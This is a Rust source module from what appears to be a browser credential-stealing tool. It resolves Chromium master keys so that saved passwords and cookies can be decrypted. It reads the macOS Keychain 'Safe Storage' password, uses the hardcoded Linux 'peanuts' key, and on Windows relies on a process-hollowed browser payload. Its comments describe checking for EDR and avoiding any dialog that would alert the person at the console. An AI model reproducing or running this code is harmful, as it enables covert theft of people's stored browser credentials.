//! Master-key resolution per platform and per browser family.
//!
//! | platform | source                                                            |
//! |----------|--------------------------------------------------------------------|
//! | Windows  | `Local State` ABE + DPAPI blobs → the browser's elevation service  |
//! |          | and `CryptUnprotectData`, BOTH invoked from inside a suspended      |
//! |          | browser instance running this binary's image (see                  |
//! |          | `crate::win32`); this process never reads `Local State`.           |
//! | macOS    | the "Safe Storage" password from the login Keychain (via the       |
//! |          | `security` CLI, the sanctioned unprivileged interface) → PBKDF2,     |
//! |          | read ONLY when the login keychain is already unlocked (checked via  |
//! |          | the non-interactive `SecKeychainGetStatus`, see `crate::keychain`)  |
//! | Linux    | the hardcoded "peanuts" password → PBKDF2, 1 iteration; keyring-    |
//! |          | wrapped v11 blobs stay unsupported.                                 |
//!
//! Key resolution runs whenever the pipeline takes the decryption path
//! (encrypted artifact classes selected, `--decrypt` on, EDR policy
//! permitting). The macOS Keychain read is the one source that can surface an
//! OS dialog, so the login keychain's lock state is checked first and a
//! locked keychain is reported unavailable rather than prompted.

use crate::crypt::KeyBag;
use crate::inventory::{Browser, Family};

/// The outcome of a key-resolution attempt for one browser.
pub struct KeyOutcome {
    /// The resolved provider keys. Empty when unavailable; extraction
    /// continues counts-only.
    pub bag: KeyBag,
    /// Machine-ish status for the report: "abe", "dpapi", "keychain",
    /// "peanuts", "not-applicable: ...", "unavailable: ...", "error: ...".
    /// Never contains a secret.
    pub status: String,
}

impl KeyOutcome {
    fn unavailable(status: impl Into<String>) -> Self {
        Self {
            bag: KeyBag::default(),
            status: status.into(),
        }
    }
}

/// Resolves the master keys for one browser. The caller skips this only when
/// the run config forbids key retrieval (decryption off, or EDR present with
/// `respect_edr`).
#[must_use]
pub fn resolve(browser: &Browser) -> KeyOutcome {
    match browser.family {
        Family::Firefox => KeyOutcome::unavailable(
            "not-applicable: Firefox logins are NSS-encrypted (unsupported)",
        ),
        Family::Safari => {
            KeyOutcome::unavailable("not-applicable: Safari stores are not decrypted by this tool")
        }
        Family::Chromium => resolve_chromium(browser),
    }
}

#[cfg(windows)]
fn resolve_chromium(_browser: &Browser) -> KeyOutcome {
    // On Windows, master-key resolution happens exclusively inside the
    // hollowed browser payload (see win32::proxy): the elevation service
    // unwraps the ABE key and DPAPI runs under the browser's identity. This
    // process never reads `Local State` or calls DPAPI; no fallback exists.
    // If anything ever lands here it gets a clear "not from this process"
    // rather than silently reading secrets from the wrong identity.
    KeyOutcome::unavailable("unavailable: key resolution runs inside the browser payload process")
}

#[cfg(target_os = "macos")]
fn resolve_chromium(browser: &Browser) -> KeyOutcome {
    if browser.safe_storage.is_empty() {
        return KeyOutcome::unavailable("unavailable: no Safe Storage service known");
    }
    // Check the login keychain's lock state BEFORE invoking `security
    // find-generic-password`; on a locked keychain that command falls back
    // to the system Keychain Access unlock dialog, which would alert whoever
    // is at the console and hang the run. Treat "couldn't determine" as
    // "locked": skip rather than risk it.
    match crate::keychain::login_keychain_unlocked() {
        Ok(true) => {}
        Ok(false) => {
            return KeyOutcome::unavailable(
                "unavailable: login keychain is locked (not unlocking: would prompt)",
            );
        }
        Err(err) => {
            return KeyOutcome::unavailable(format!(
                "unavailable: could not determine keychain lock state: {err}"
            ));
        }
    }
    // The `security` CLI is the sanctioned unprivileged Keychain interface.
    // The lock check above rules out the whole-keychain unlock dialog; a
    // per-item ACL confirmation is a narrower, separate mechanism it cannot
    // cover.
    match std::process::Command::new("security")
        .args(["find-generic-password", "-s", browser.safe_storage, "-w"])
        .output()
    {
        Ok(out) if out.status.success() => {
            let password = String::from_utf8_lossy(&out.stdout).trim_end().to_string();
            if password.is_empty() {
                return KeyOutcome::unavailable("error: empty Safe Storage password");
            }
            KeyOutcome {
                bag: KeyBag {
                    legacy: Some(crate::crypt::legacy_key_from_password(
                        password.as_bytes(),
                        1003,
                    )),
                    ..Default::default()
                },
                status: "keychain".to_string(),
            }
        }
        Ok(out) => KeyOutcome::unavailable(format!(
            "unavailable: keychain read denied (exit {})",
            out.status.code().unwrap_or(-1)
        )),
        Err(err) => KeyOutcome::unavailable(format!("error: security CLI failed: {err}")),
    }
}

#[cfg(all(unix, not(target_os = "macos")))]
fn resolve_chromium(_browser: &Browser) -> KeyOutcome {
    // Legacy v10 blobs decrypt under the well-known "peanuts" key. v11
    // (keyring-wrapped) blobs fail per-value.
    KeyOutcome {
        bag: KeyBag {
            legacy: Some(crate::crypt::legacy_key_from_password(b"peanuts", 1)),
            ..Default::default()
        },
        status: "peanuts".to_string(),
    }
}

#[cfg(not(any(unix, windows)))]
fn resolve_chromium(_browser: &Browser) -> KeyOutcome {
    KeyOutcome::unavailable("unsupported: platform")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn browser(id: &'static str, family: Family, safe_storage: &'static str) -> Browser {
        Browser {
            id,
            label: id,
            family,
            user_data: PathBuf::from("/nonexistent"),
            safe_storage,
            abe: None,
            exe_candidates: Vec::new(),
        }
    }

    #[test]
    fn firefox_and_safari_are_not_applicable() {
        let firefox = browser("firefox", Family::Firefox, "");
        let outcome = resolve(&firefox);
        assert!(outcome.bag.is_empty());
        assert!(outcome.status.starts_with("not-applicable"));
        let safari = browser("safari", Family::Safari, "");
        assert!(resolve(&safari).status.starts_with("not-applicable"));
    }
}
